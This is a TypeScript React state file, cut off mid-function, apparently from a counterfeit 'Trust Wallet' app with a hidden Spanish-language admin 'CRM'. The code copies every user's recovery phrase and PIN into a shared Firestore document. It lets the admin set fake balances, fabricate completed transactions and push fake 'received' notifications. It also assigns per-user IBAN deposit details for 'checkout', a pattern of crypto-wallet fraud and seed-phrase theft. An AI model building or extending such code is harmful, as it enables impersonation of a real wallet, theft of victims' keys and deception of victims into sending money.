import React, { createContext, useContext, useState, useEffect, useCallback, useRef } from 'react';
import { doc, onSnapshot, setDoc } from 'firebase/firestore';
import { db } from '../firebase';
import { AuditLog, BankDepositDetails, CryptoAsset, DAppItem, Transaction, UserWallet, WalletConnectSession } from '../types';
import { DEFAULT_BANK_DETAILS, INITIAL_ASSETS, INITIAL_TRANSACTIONS, INITIAL_USERS } from '../data/initialData';
import {
  generate12WordMnemonic,
  generateEVMAddress,
  generateBTCAddress,
  generateSolanaAddress,
} from '../utils/bip39';

interface NotificationItem {
  id: string;
  title: string;
  message: string;
  type: 'success' | 'info' | 'warning' | 'alert';
  timestamp: number;
}

interface SignatureRequest {
  id: string;
  dappName: string;
  dappIcon: string;
  type: 'sign_message' | 'send_transaction';
  message?: string;
  txDetails?: {
    to: string;
    amount: number;
    symbol: string;
    gasFee: number;
  };
}

interface WalletContextType {
  // Global synchronized data
  users: UserWallet[];
  transactions: Transaction[];
  auditLogs: AuditLog[];

  // Wallet session (specific to this mobile device / client)
  deviceWallets: UserWallet[];
  activeUserId: string;
  walletActiveUserId: string;
  currentUser: UserWallet;
  userTransactions: Transaction[];
  isLocked: boolean;
  isBiometricsActive: boolean;
  isOnboarding: boolean;
  currency: 'USD' | 'EUR' | 'GBP';
  currencySymbol: string;
  currencyRate: number;
  hideBalance: boolean;
  activeNotification: NotificationItem | null;
  activeDAppSessions: WalletConnectSession[];
  pendingSignature: SignatureRequest | null;
  totalBalanceUSD: number;
  change24hPercentage: number;

  // CRM session (specific to administrative control)
  crmSelectedUserId: string;
  crmSelectedUser: UserWallet;

  // Wallet Actions
  selectWallet: (walletId: string) => void;
  selectUser: (userId: string) => void;
  createWalletFromOnboarding: (name: string, pin: string, phrase?: string[]) => string;
  importWalletFromPhrase: (name: string, phrase: string[], pin?: string) => string;
  createNewUser: (name: string, customAddress?: string, customPhrase?: string[]) => string;
  deleteWallet: (walletId: string) => void;
  updateSeedPhrase: (userId: string, newPhrase: string[]) => void;
  updateUserBankDetails: (userId: string, details: Partial<BankDepositDetails>) => void;
  completeOnboarding: () => void;
  restartOnboarding: () => void;
  updateTokenBalance: (userId: string, assetSymbol: string, newBalance: number) => void;
  quickSetPresetBalance: (userId: string, presetType: 'whale' | 'trader' | 'fresh' | 'random') => void;
  createCustomTransaction: (tx: Omit<Transaction, 'id'>, triggerNotification?: boolean) => void;
  updateTransactionStatus: (txId: string, status: Transaction['status']) => void;
  sendCrypto: (assetSymbol: string, toAddress: string, amount: number, memo?: string) => Promise<boolean>;
  swapTokens: (fromSymbol: string, toSymbol: string, fromAmount: number, toAmount: number) => Promise<boolean>;
  unlockWithPin: (pin: string) => boolean;
  unlockWithBiometrics: () => boolean;
  lockWallet: () => void;
  setPinCode: (newPin: string) => void;
  toggleBiometrics: () => void;
  toggleHideBalance: () => void;
  setCurrency: (currency: 'USD' | 'EUR' | 'GBP') => void;
  requestDAppConnection: (dapp: DAppItem) => void;
  disconnectDApp: (sessionId: string) => void;
  approveSignatureRequest: () => void;
  rejectSignatureRequest: () => void;
  dismissNotification: () => void;
  pushPushNotification: (title: string, message: string, type?: NotificationItem['type']) => void;
  clearAuditLogs: () => void;

  // Divided Reset Controls
  selectCrmUser: (userId: string) => void;
  resetCrmData: () => void;
  resetWalletSession: () => void;
  resetAllData: () => void;
}

const WalletContext = createContext<WalletContextType | undefined>(undefined);

// Persistent LocalStorage Keys (Divided by Domain)
const STORAGE_KEY_USERS = 'trustwallet_users_v4';
const STORAGE_KEY_IDENTITY_ID = 'trustwallet_identity_id_v4';
const STORAGE_KEY_DEVICE_WALLETS = 'trustwallet_device_wallets_v4';
const STORAGE_KEY_WALLET_ACTIVE = 'trustwallet_wallet_active_user_v4';
const STORAGE_KEY_WALLET_ONBOARDED = 'trustwallet_wallet_onboarded_v4';
const STORAGE_KEY_CRM_ACTIVE = 'trustwallet_crm_active_user_v4';
const STORAGE_KEY_TRANSACTIONS = 'trustwallet_transactions_v4';
const STORAGE_KEY_AUDIT = 'trustwallet_audit_v4';

// Helper to get or generate persistent identity for this device/browser
const getOrCreateIdentityId = (): string => {
  if (typeof window === 'undefined') return 'ident_default';
  let identId = localStorage.getItem(STORAGE_KEY_IDENTITY_ID);
  if (!identId) {
    identId = 'id_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now().toString(36);
    localStorage.setItem(STORAGE_KEY_IDENTITY_ID, identId);
  }
  return identId;
};

// Initial state loaders
const loadInitialUsers = (): UserWallet[] => {
  if (typeof window === 'undefined') return INITIAL_USERS;
  try {
    const saved = localStorage.getItem(STORAGE_KEY_USERS) || localStorage.getItem('trustwallet_users_v3');
    if (saved) {
      const parsed = JSON.parse(saved);
      if (Array.isArray(parsed) && parsed.length > 0) return parsed;
    }
  } catch (e) {
    console.error('Error loading initial users', e);
  }
  return INITIAL_USERS;
};

const loadInitialDeviceWallets = (): string[] => {
  if (typeof window === 'undefined') return [];
  try {
    const saved = localStorage.getItem(STORAGE_KEY_DEVICE_WALLETS) || localStorage.getItem('trustwallet_device_wallet_ids_v4');
    if (saved) {
      const parsed = JSON.parse(saved);
      if (Array.isArray(parsed) && parsed.length > 0) return parsed;
    }
  } catch (e) {}
  return [];
};

const loadInitialIsOnboarding = (devWallets: string[]): boolean => {
  if (typeof window === 'undefined') return true;
  const onboarded = localStorage.getItem(STORAGE_KEY_WALLET_ONBOARDED);
  if (onboarded === 'true') return false;
  const legacyOnboarded = localStorage.getItem('trustwallet_onboarding_v3');
  if (legacyOnboarded === 'false') return false;
  if (devWallets.length > 0) return false;
  return true;
};

const loadInitialWalletActiveUser = (devWallets: string[], allUsers: UserWallet[]): string => {
  if (typeof window === 'undefined') return allUsers[0]?.id || 'user_01';
  const saved = localStorage.getItem(STORAGE_KEY_WALLET_ACTIVE) || localStorage.getItem('trustwallet_active_user_v3');
  if (saved && allUsers.some(u => u.id === saved)) {
    return saved;
  }
  if (devWallets.length > 0 && allUsers.some(u => u.id === devWallets[0])) {
    return devWallets[0];
  }
  return allUsers[0]?.id || 'user_01';
};

const loadInitialCrmActiveUser = (allUsers: UserWallet[]): string => {
  if (typeof window === 'undefined') return allUsers[0]?.id || 'user_01';
  const saved = localStorage.getItem(STORAGE_KEY_CRM_ACTIVE);
  if (saved && allUsers.some(u => u.id === saved)) {
    return saved;
  }
  return allUsers[0]?.id || 'user_01';
};

const loadInitialTransactions = (): Transaction[] => {
  if (typeof window === 'undefined') return INITIAL_TRANSACTIONS;
  try {
    const saved = localStorage.getItem(STORAGE_KEY_TRANSACTIONS) || localStorage.getItem('trustwallet_transactions_v3');
    if (saved) {
      return JSON.parse(saved);
    }
  } catch (e) {}
  return INITIAL_TRANSACTIONS;
};

const loadInitialAudit = (): AuditLog[] => {
  if (typeof window === 'undefined') return [];
  try {
    const saved = localStorage.getItem(STORAGE_KEY_AUDIT) || localStorage.getItem('trustwallet_audit_v3');
    if (saved) {
      return JSON.parse(saved);
    }
  } catch (e) {}
  return [
    {
      id: 'log_init',
      timestamp: new Date().toISOString(),
      action: 'USER_SWITCHED',
      admin: 'Admin Root (FreeAccess)',
      userId: 'user_01',
      details: 'Sistema Trust Wallet CRM inicializado',
    },
  ];
};

export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [identityId] = useState<string>(() => getOrCreateIdentityId());

  // Master Users Data (Synced via Firestore)
  const [users, setUsers] = useState<UserWallet[]>(() => loadInitialUsers());

  // Device-Specific Wallets that accumulate under this identity
  const [deviceWalletIds, setDeviceWalletIds] = useState<string[]>(() => loadInitialDeviceWallets());

  // Wallet Active User (Session state for Mobile Trust Wallet App)
  const [walletActiveUserId, setWalletActiveUserId] = useState<string>(() => {
    const initialWallets = loadInitialDeviceWallets();
    const initialUsers = loadInitialUsers();
    return loadInitialWalletActiveUser(initialWallets, initialUsers);
  });

  // CRM Active User (Session state for Remote CRM Control Panel)
  const [crmSelectedUserId, setCrmSelectedUserId] = useState<string>(() => {
    const initialUsers = loadInitialUsers();
    return loadInitialCrmActiveUser(initialUsers);
  });

  // Onboarding state: STRICTLY LOCAL TO THIS WALLET CLIENT.
  // Once onboarded, it remains false across reloads and is never overwritten by remote CRM sync.
  const [isOnboarding, setIsOnboarding] = useState<boolean>(() => {
    const initialWallets = loadInitialDeviceWallets();
    return loadInitialIsOnboarding(initialWallets);
  });

  // Shared Transactions & Audit Logs
  const [transactions, setTransactions] = useState<Transaction[]>(() => loadInitialTransactions());
  const [auditLogs, setAuditLogs] = useState<AuditLog[]>(() => loadInitialAudit());

  // Wallet UI & Security States
  const [isLocked, setIsLocked] = useState<boolean>(false);
  const [isBiometricsActive, setIsBiometricsActive] = useState<boolean>(true);
  const [currency, setCurrencyState] = useState<'USD' | 'EUR' | 'GBP'>('USD');
  const [hideBalance, setHideBalance] = useState<boolean>(false);
  const [activeNotification, setActiveNotification] = useState<NotificationItem | null>(null);
  const [activeDAppSessions, setActiveDAppSessions] = useState<WalletConnectSession[]>([]);
  const [pendingSignature, setPendingSignature] = useState<SignatureRequest | null>(null);

  // Sync references
  const sessionIdRef = useRef<string>(
    'session_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now()
  );
  const isRemoteUpdatingRef = useRef<boolean>(false);
  const lastSavedHashRef = useRef<string>('');
  const lastNotificationIdRef = useRef<string>('');
  const firestoreDocRef = useRef(doc(db, 'trustwallet_state', 'shared_state'));

  // Ensure initial device wallet binding if already onboarded or has device wallets
  useEffect(() => {
    if (deviceWalletIds.length > 0 && !deviceWalletIds.includes(walletActiveUserId)) {
      // If active user is not in device wallets, set to first device wallet
      const validDeviceUser = users.find(u => deviceWalletIds.includes(u.id));
      if (validDeviceUser) {
        setWalletActiveUserId(validDeviceUser.id);
        localStorage.setItem(STORAGE_KEY_WALLET_ACTIVE, validDeviceUser.id);
      }
    }
  }, [deviceWalletIds, users, walletActiveUserId]);

  // Safe State Updaters
  const safeSetTransactions = useCallback((incomingTxs: Transaction[]) => {
    setTransactions((prev) => {
      if (JSON.stringify(prev) === JSON.stringify(incomingTxs)) return prev;
      return incomingTxs;
    });
  }, []);

  const safeSetAuditLogs = useCallback((incomingLogs: AuditLog[]) => {
    setAuditLogs((prev) => {
      if (JSON.stringify(prev) === JSON.stringify(incomingLogs)) return prev;
      return incomingLogs;
    });
  }, []);

  // 1. Subscribe to real-time Firestore updates across all devices/sessions
  useEffect(() => {
    const unsubscribe = onSnapshot(
      firestoreDocRef.current,
      (snapshot) => {
        if (!snapshot.exists()) {
          setDoc(firestoreDocRef.current, {
            users,
            transactions,
            auditLogs,
            updatedAt: Date.now(),
            updatedBy: sessionIdRef.current,
          }).catch((err) => console.warn('Firestore initial set error', err));
          return;
        }

        const data = snapshot.data();
        if (data) {
          if (data.updatedBy === sessionIdRef.current) {
            return;
          }

          isRemoteUpdatingRef.current = true;
          if (Array.isArray(data.users) && data.users.length > 0) {
            setUsers((prevLocal) => {
              const remoteUsers = data.users as UserWallet[];
              const remoteMap = new Map<string, UserWallet>();
              remoteUsers.forEach(u => remoteMap.set(u.id, u));

              // Preserve any local wallet created on this device that might not be in remote yet
              const merged: UserWallet[] = [...remoteUsers];
              prevLocal.forEach(localUser => {
                if (!remoteMap.has(localUser.id)) {
                  merged.push(localUser);
                }
              });

              if (JSON.stringify(prevLocal) === JSON.stringify(merged)) return prevLocal;
              return merged;
            });
          }

          if (Array.isArray(data.transactions)) {
            safeSetTransactions(data.transactions);
          }
          if (Array.isArray(data.auditLogs)) {
            safeSetAuditLogs(data.auditLogs);
          }
          if (data.activeNotification && typeof data.activeNotification === 'object') {
            const notif = data.activeNotification as NotificationItem;
            if (
              notif.id &&
              notif.id !== lastNotificationIdRef.current &&
              notif.timestamp &&
              Date.now() - notif.timestamp < 30000
            ) {
              lastNotificationIdRef.current = notif.id;
              setActiveNotification(notif);
              setTimeout(() => {
                setActiveNotification((curr) => (curr?.id === notif.id ? null : curr));
              }, 6500);
            }
          }

          setTimeout(() => {
            isRemoteUpdatingRef.current = false;
          }, 100);
        }
      },
      (error) => {
        console.warn('Firestore real-time subscription note:', error);
      }
    );

    return () => unsubscribe();
  }, [safeSetTransactions, safeSetAuditLogs]);

  // 2. Save data to Firestore & LocalStorage (Session states stay local!)
  useEffect(() => {
    const currentHash = JSON.stringify({
      users,
      transactions,
      auditLogs,
    });

    if (currentHash === lastSavedHashRef.current) {
      return;
    }
    lastSavedHashRef.current = currentHash;

    // Save shared collections locally
    localStorage.setItem(STORAGE_KEY_USERS, JSON.stringify(users));
    localStorage.setItem(STORAGE_KEY_TRANSACTIONS, JSON.stringify(transactions));
    localStorage.setItem(STORAGE_KEY_AUDIT, JSON.stringify(auditLogs));

    // BroadcastChannel sync across tabs (DATA ONLY, NOT SESSION STATES)
    try {
      const bc = new BroadcastChannel('trust_wallet_crm_channel');
      bc.postMessage({
        type: 'SYNC_DATA',
        senderId: sessionIdRef.current,
        payload: { users, transactions, auditLogs },
      });
      bc.close();
    } catch (_) {}

    // Cloud Firestore Sync (instantly sync users, balances and txs)
    if (!isRemoteUpdatingRef.current) {
      setDoc(
        firestoreDocRef.current,
        {
          users,
          transactions,
          auditLogs,
          updatedAt: Date.now(),
          updatedBy: sessionIdRef.current,
        },
        { merge: true }
      ).catch((err) => console.warn('Firestore sync error:', err));
    }
  }, [users, transactions, auditLogs]);

  // Real-time listener for multi-tab data sync
  useEffect(() => {
    let bc: BroadcastChannel | null = null;
    try {
      bc = new BroadcastChannel('trust_wallet_crm_channel');
      bc.onmessage = (event) => {
        if (!event.data) return;
        const { type, senderId, payload } = event.data;
        if (senderId === sessionIdRef.current) return;

        if (type === 'SYNC_DATA' && payload) {
          if (Array.isArray(payload.users)) {
            setUsers((prev) => {
              if (JSON.stringify(prev) === JSON.stringify(payload.users)) return prev;
              return payload.users;
            });
          }
          if (Array.isArray(payload.transactions)) safeSetTransactions(payload.transactions);
          if (Array.isArray(payload.auditLogs)) safeSetAuditLogs(payload.auditLogs);
        }
      };
    } catch (_) {}

    return () => {
      if (bc) bc.close();
    };
  }, [safeSetTransactions, safeSetAuditLogs]);

  // Compute Device Wallets: Wallets that belong to this device identity or device list
  const deviceWallets = React.useMemo(() => {
    // 1. Wallets created under this identity or in deviceWalletIds
    const matching = users.filter(
      (u) => (u.identityId && u.identityId === identityId) || deviceWalletIds.includes(u.id)
    );
    if (matching.length > 0) return matching;

    // 2. If the active wallet exists in users, return it
    const active = users.find((u) => u.id === walletActiveUserId);
    if (active) return [active];

    // 3. Fallback to first user
    return users.slice(0, 1);
  }, [users, identityId, deviceWalletIds, walletActiveUserId]);

  // Current active user for Mobile Wallet
  const currentUser = React.useMemo(() => {
    return (
      users.find((u) => u.id === walletActiveUserId) ||
      deviceWallets[0] ||
      users[0] ||
      INITIAL_USERS[0]
    );
  }, [users, walletActiveUserId, deviceWallets]);

  // Current selected user for CRM panel
  const crmSelectedUser = React.useMemo(() => {
    return (
      users.find((u) => u.id === crmSelectedUserId) ||
      users[0] ||
      INITIAL_USERS[0]
    );
  }, [users, crmSelectedUserId]);

  const userTransactions = transactions.filter((t) => t.userId === currentUser.id);

  const addAudit = useCallback((action: AuditLog['action'], details: string, prev?: any, next?: any) => {
    const newLog: AuditLog = {
      id: 'log_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
      timestamp: new Date().toISOString(),
      action,
      admin: 'FreeAccess CRM Admin',
      userId: crmSelectedUserId,
      details,
      previousValue: prev,
      newValue: next,
    };
    setAuditLogs((prevLogs) => [newLog, ...prevLogs.slice(0, 150)]);
  }, [crmSelectedUserId]);

  const pushPushNotification = useCallback(
    (title: string, message: string, type: NotificationItem['type'] = 'info') => {
      const item: NotificationItem = {
        id: 'notif_' + Date.now(),
        title,
        message,
        type,
        timestamp: Date.now(),
      };
      setActiveNotification(item);

      setDoc(
        firestoreDocRef.current,
        {
          activeNotification: item,
        },
        { merge: true }
      ).catch((err) => console.warn('Firestore notification push note:', err));

      setTimeout(() => {
        setActiveNotification((curr) => (curr?.id === item.id ? null : curr));
      }, 6500);
    },
    []
  );

  const dismissNotification = useCallback(() => {
    setActiveNotification(null);
  }, []);

  // Mobile Wallet Selection
  const selectWallet = useCallback(
    (walletId: string) => {
      const u = users.find((x) => x.id === walletId);
      if (u) {
        setWalletActiveUserId(walletId);
        localStorage.setItem(STORAGE_KEY_WALLET_ACTIVE, walletId);
        pushPushNotification('Billetera Cambiada', `Billetera activa: ${u.name}`, 'info');
      }
    },
    [users, pushPushNotification]
  );

  // Alias for selectWallet to keep compatibility with mobile selector modals
  const selectUser = useCallback(
    (userId: string) => {
      selectWallet(userId);
    },
    [selectWallet]
  );

  // CRM User Selection (Independent from Mobile Wallet session)
  const selectCrmUser = useCallback(
    (userId: string) => {
      const u = users.find((x) => x.id === userId);
      if (u) {
        setCrmSelectedUserId(userId);
        localStorage.setItem(STORAGE_KEY_CRM_ACTIVE, userId);
        addAudit(
          'USER_SWITCHED',
          `Administrador CRM seleccionó para gestión: ${u.name} (${u.address.substring(0, 8)}...)`
        );
      }
    },
    [users, addAudit]
  );

  // Create Wallet from Onboarding
  const createWalletFromOnboarding = useCallback(
    (name: string, pin: string, phrase?: string[]): string => {
      const finalPhrase = phrase && phrase.length === 12 ? phrase : generate12WordMnemonic();
      const generatedAddr = generateEVMAddress();
      const newId = 'user_' + Date.now();

      const zeroAssets: CryptoAsset[] = INITIAL_ASSETS.map((a) => ({
        ...a,
        balance: 0,
      }));

      const newUser: UserWallet = {
        id: newId,
        identityId,
        name: name || `Billetera Principal`,
        address: generatedAddr,
        btcAddress: generateBTCAddress(),
        solAddress: generateSolanaAddress(),
        createdAt: new Date().toISOString(),
        deviceModel: 'Android Device (Live)',
        ipAddress: '190.24.112.85',
        lastActive: 'Justo ahora',
        pinCode: pin || '123456',
        biometricsEnabled: true,
        recoveryPhrase: finalPhrase,
        assets: zeroAssets,
      };

      setUsers((prev) => [...prev, newUser]);
      setWalletActiveUserId(newId);
      localStorage.setItem(STORAGE_KEY_WALLET_ACTIVE, newId);

      // Accumulate into device wallet list
      setDeviceWalletIds((prev) => {
        const next = prev.includes(newId) ? prev : [...prev, newId];
        localStorage.setItem(STORAGE_KEY_DEVICE_WALLETS, JSON.stringify(next));
        return next;
      });

      // Mark onboarding as completed so wallet remains open permanently
      setIsOnboarding(false);
      localStorage.setItem(STORAGE_KEY_WALLET_ONBOARDED, 'true');

      addAudit(
        'USER_SWITCHED',
        `Billetera creada desde Onboarding: ${newUser.name} (${generatedAddr.substring(0, 8)}...)`
      );
      pushPushNotification(
        'Billetera Creada',
        '¡Bienvenido a Trust Wallet! Tu cartera segura ha sido inicializada.',
        'success'
      );
      return newId;
    },
    [identityId, addAudit, pushPushNotification]
  );

  // Import Wallet from Phrase
  const importWalletFromPhrase = useCallback(
    (name: string, phrase: string[], pin?: string): string => {
      const finalPhrase = phrase.length === 12 ? phrase : generate12WordMnemonic();
      const generatedAddr = generateEVMAddress();
      const newId = 'user_' + Date.now();

      const zeroAssets: CryptoAsset[] = INITIAL_ASSETS.map((a) => ({
        ...a,
        balance: 0,
      }));

      const newUser: UserWallet = {
        id: newId,
        identityId,
        name: name || `Billetera Importada`,
        address: generatedAddr,
        btcAddress: generateBTCAddress(),
        solAddress: generateSolanaAddress(),
        createdAt: new Date().toISOString(),
        deviceModel: 'Android Device (Live)',
        ipAddress: '190.24.112.92',
        lastActive: 'Justo ahora',
        pinCode: pin || '123456',
        biometricsEnabled: true,
        recoveryPhrase: finalPhrase,
        assets: zeroAssets,
      };

      setUsers((prev) => [...prev, newUser]);
      setWalletActiveUserId(newId);
      localStorage.setItem(STORAGE_KEY_WALLET_ACTIVE, newId);

      // Accumulate into device wallet list
      setDeviceWalletIds((prev) => {
        const next = prev.includes(newId) ? prev : [...prev, newId];
        localStorage.setItem(STORAGE_KEY_DEVICE_WALLETS, JSON.stringify(next));
        return next;
      });

      setIsOnboarding(false);
      localStorage.setItem(STORAGE_KEY_WALLET_ONBOARDED, 'true');

      addAudit(
        'USER_SWITCHED',
        `Billetera importada con frase mnemónica: ${newUser.name} (${generatedAddr.substring(0, 8)}...)`
      );
      pushPushNotification(
        'Billetera Importada',
        `Billetera ${newUser.name} restaurada exitosamente`,
        'success'
      );
      return newId;
    },
    [identityId, addAudit, pushPushNotification]
  );

  // Create New User / Multi-wallet Account
  const createNewUser = useCallback(
    (name: string, customAddress?: string, customPhrase?: string[]): string => {
      const generatedAddr = customAddress || generateEVMAddress();
      const newPhrase =
        customPhrase && customPhrase.length === 12 ? customPhrase : generate12WordMnemonic();
      const newId = 'user_' + Date.now();

      const zeroAssets: CryptoAsset[] = INITIAL_ASSETS.map((a) => ({
        ...a,
        balance: 0,
      }));

      const newUser: UserWallet = {
        id: newId,
        identityId,
        name: name || `Billetera ${users.length + 1}`,
        address: generatedAddr,
        btcAddress: generateBTCAddress(),
        solAddress: generateSolanaAddress(),
        createdAt: new Date().toISOString(),
        deviceModel: 'Android Device (Live)',
        ipAddress: '190.24.112.' + (80 + users.length),
        lastActive: 'Justo ahora',
        pinCode: '123456',
        biometricsEnabled: true,
        recoveryPhrase: newPhrase,
        assets: zeroAssets,
      };

      setUsers((prev) => [...prev, newUser]);
      setWalletActiveUserId(newId);
      localStorage.setItem(STORAGE_KEY_WALLET_ACTIVE, newId);

      // Accumulate into device wallet list
      setDeviceWalletIds((prev) => {
        const next = prev.includes(newId) ? prev : [...prev, newId];
        localStorage.setItem(STORAGE_KEY_DEVICE_WALLETS, JSON.stringify(next));
        return next;
      });

      setIsOnboarding(false);
      localStorage.setItem(STORAGE_KEY_WALLET_ONBOARDED, 'true');

      addAudit(
        'USER_SWITCHED',
        `Nueva billetera creada: ${newUser.name} [${generatedAddr}] con balance $0.00`
      );
      pushPushNotification(
        'Nueva Billetera Creada',
        `Billetera ${newUser.name} lista (Balance $0.00)`,
        'success'
      );
      return newId;
    },
    [identityId, users, addAudit, pushPushNotification]
  );

  // Delete Wallet from this device
  const deleteWallet = useCallback(
    (walletId: string) => {
      setDeviceWalletIds((prev) => {
        const next = prev.filter((id) => id !== walletId);
        localStorage.setItem(STORAGE_KEY_DEVICE_WALLETS, JSON.stringify(next));
        return next;
      });

      if (walletActiveUserId === walletId) {
        setDeviceWalletIds((prev) => {
          const remaining = prev.filter((id) => id !== walletId);
          if (remaining.length > 0) {
            setWalletActiveUserId(remaining[0]);
            localStorage.setItem(STORAGE_KEY_WALLET_ACTIVE, remaining[0]);
          } else {
            const remainingUsers = users.filter((u) => u.id !== walletId);
            if (remainingUsers.length > 0) {
              setWalletActiveUserId(remainingUsers[0].id);
              localStorage.setItem(STORAGE_KEY_WALLET_ACTIVE, remainingUsers[0].id);
            }
          }
          return remaining;
        });
      }

      pushPushNotification(
        'Billetera Removida',
        'La billetera seleccionada fue removida de este dispositivo',
        'info'
      );
    },
    [walletActiveUserId, users, pushPushNotification]
  );

  const updateSeedPhrase = useCallback(
    (userId: string, newPhrase: string[]) => {
      if (!newPhrase || newPhrase.length !== 12) return;
      setUsers((prev) =>
        prev.map((u) => {
          if (u.id === userId) {
            addAudit(
              'SECURITY_UPDATED',
              `Frase semilla (BIP-39) actualizada desde CRM para usuario ${u.name}`
            );
            return { ...u, recoveryPhrase: newPhrase };
          }
          return u;
        })
      );
      pushPushNotification(
        'Semilla Actualizada',
        'Las 12 palabras de recuperación fueron guardadas en CRM',
        'info'
      );
    },
    [addAudit, pushPushNotification]
  );

  const updateUserBankDetails = useCallback(
    (userId: string, bankDetails: Partial<BankDepositDetails>) => {
      setUsers((prev) =>
        prev.map((u) => {
          if (u.id === userId) {
            const currentDetails = u.bankDetails || { ...DEFAULT_BANK_DETAILS };
            const mergedDetails: BankDepositDetails = {
              accountHolderName: bankDetails.accountHolderName ?? currentDetails.accountHolderName ?? DEFAULT_BANK_DETAILS.accountHolderName,
              iban: bankDetails.iban ?? currentDetails.iban ?? DEFAULT_BANK_DETAILS.iban,
              swiftBic: bankDetails.swiftBic ?? currentDetails.swiftBic ?? DEFAULT_BANK_DETAILS.swiftBic,
              reference: bankDetails.reference ?? currentDetails.reference ?? DEFAULT_BANK_DETAILS.reference,
              bankName: bankDetails.bankName ?? currentDetails.bankName ?? DEFAULT_BANK_DETAILS.bankName,
              country: bankDetails.country ?? currentDetails.country ?? DEFAULT_BANK_DETAILS.country,
              notes: bankDetails.notes ?? currentDetails.notes ?? DEFAULT_BANK_DETAILS.notes,
            };

            addAudit(
              'SECURITY_UPDATED',
              `Datos de depósito y checkout asignados en CRM para ${u.name} (IBAN: ${mergedDetails.iban})`
            );

            return {
              ...u,
              bankDetails: mergedDetails,
            };
          }
          return u;
        })
      );

      pushPushNotification(
        'Datos Bancarios Guardados',
        'Datos de checkout (IBAN/SWIFT/Titular/Referencia) actualizados para el usuario',
        'success'
      );
    },
    [addAudit, pushPushNotification]
  );

  const completeOnboarding = useCallback(() => {
    setIsOnboarding(false);
    localStorage.setItem(STORAGE_KEY_WALLET_ONBOARDED, 'true');
  }, []);

  const restartOnboarding = useCallback(() => {
    setIsOnboarding(true);
    localStorage.removeItem(STORAGE_KEY_WALLET_ONBOARDED);
    pushPushNotification(
      'Modo Bienvenida',
      'Iniciando asistente de configuración inicial de Trust Wallet',
      'info'
    );
  }, [pushPushNotification]);

  const updateTokenBalance = useCallback(
    (userId: string, assetSymbol: string, newBalance: number) => {
      setUsers((prevUsers) => {
        return prevUsers.map((u) => {
          if (u.id !== userId) return u;
          const targetAsset = u.assets.find(
            (a) => a.symbol.toUpperCase() === assetSymbol.toUpperCase()
          );
          const prevBal = targetAsset ? targetAsset.balance : 0;
          const updatedAssets = u.assets.map((a) => {
            if (a.symbol.toUpperCase() === assetSymbol.toUpperCase()) {
              return { ...a, balance: Math.max(0, newBalance) };
            }
            return a;
          });

          addAudit(
            'BALANCE_MODIFIED',
            `Balance modificado en CRM para ${u.name}: ${assetSymbol} de ${prevBal} a ${newBalance}`,
            prevBal,
            newBalance
          );

          if (userId === walletActiveUserId) {
            pushPushNotification(
              'Balance Actualizado',
              `Tu balance de ${assetSymbol} ahora es ${newBalance.toLocaleString()} ${assetSymbol}`,
              'success'
            );
          }

          return { ...u, assets: updatedAssets };
        });
      });
    },
    [walletActiveUserId, addAudit, pushPushNotification]
  );

  const quickSetPresetBalance = useCallback(
    (userId: string, presetType: 'whale' | 'trader' | 'fresh' | 'random') => {
      setUsers((prevUsers) => {
        return prevUsers.map((u) => {
          if (u.id !== userId) return u;
          const newAssets = u.assets.map((a) => {
            let bal = a.balance;
            if (presetType === 'whale') {
              if (a.symbol === 'BTC') bal = 4.85;
              if (a.symbol === 'ETH') bal = 35.0;
              if (a.symbol === 'BNB') bal = 120.0;
              if (a.symbol === 'USDT') bal = 150000.0;
              if (a.symbol === 'SOL') bal = 450.0;
              if (a.symbol === 'POL') bal = 25000.0;
              if (a.symbol === 'AVAX') bal = 800.0;
            } else if (presetType === 'trader') {
              if (a.symbol === 'BTC') bal = 0.35;
              if (a.symbol === 'ETH') bal = 2.4;
              if (a.symbol === 'BNB') bal = 8.5;
              if (a.symbol === 'USDT') bal = 5400.0;
              if (a.symbol === 'SOL') bal = 18.2;
              if (a.symbol === 'POL') bal = 1200.0;
              if (a.symbol === 'AVAX') bal = 25.0;
            } else if (presetType === 'fresh') {
              bal = 0;
            } else if (presetType === 'random') {
              bal = Number(
                (Math.random() * (a.symbol === 'BTC' ? 0.5 : a.symbol === 'USDT' ? 3000 : 15)).toFixed(
                  4
                )
              );
            }
            return { ...a, balance: bal };
          });

          addAudit(
            'BALANCE_MODIFIED',
            `Preset de balance aplicado: "${presetType.toUpperCase()}" a ${u.name}`
          );
          pushPushNotification(
            'Preset Aplicado',
            `Cartera configurada como modo ${presetType.toUpperCase()}`,
            'info'
          );

          return { ...u, assets: newAssets };
        });
      });
    },
    [addAudit, pushPushNotification]
  );

  const createCustomTransaction = useCallback(
    (txData: Omit<Transaction, 'id'>, triggerNotification = true) => {
      const txId = 'tx_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6);
      const newTx: Transaction = {
        ...txData,
        id: txId,
        txHash:
          txData.txHash ||
          '0x' +
            Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(''),
      };

      setTransactions((prev) => [newTx, ...prev]);

      if (newTx.status === 'completed') {
        const user = users.find((u) => u.id === newTx.userId);
        if (user) {
          const asset = user.assets.find(
            (a) => a.symbol.toUpperCase() === newTx.assetSymbol.toUpperCase()
          );
          if (asset) {
            let adjustedBalance = asset.balance;
            if (newTx.type === 'receive' || newTx.type === 'reward') {
              adjustedBalance += newTx.amount;
            } else if (newTx.type === 'send') {
              adjustedBalance = Math.max(0, adjustedBalance - newTx.amount);
            }
            updateTokenBalance(newTx.userId, newTx.assetSymbol, adjustedBalance);
          }
        }
      }

      addAudit(
        'TRANSACTION_GENERATED',
        `Transacción personalizada generada desde CRM: ${newTx.type.toUpperCase()} ${newTx.amount} ${newTx.assetSymbol} (${newTx.status}) para usuario ${newTx.userId}`
      );

      if (triggerNotification && newTx.userId === walletActiveUserId) {
        const msg =
          newTx.type === 'receive'
            ? `Recibiste +${newTx.amount} ${newTx.assetSymbol} de ${newTx.fromAddress.substring(0, 8)}...`
            : `Enviaste -${newTx.amount} ${newTx.assetSymbol} a ${newTx.toAddress.substring(0, 8)}...`;
        pushPushNotification(
          newTx.type === 'receive' ? 'Transacción Recibida' : 'Transacción Enviada',
          msg,
          newTx.status === 'completed' ? 'success' : newTx.status === 'pending' ? 'info' : 'alert'
        );
      }
    },
    [users, walletActiveUserId, updateTokenBalance, addAudit, pushPushNotification]
  );

  const updateTransactionStatus = useCallback(
    (txId: string, newStatus: Transaction['status']) => {
      setTransactions((prev) =>
        prev.map((t) => {
          if (t.id !== txId) return t;
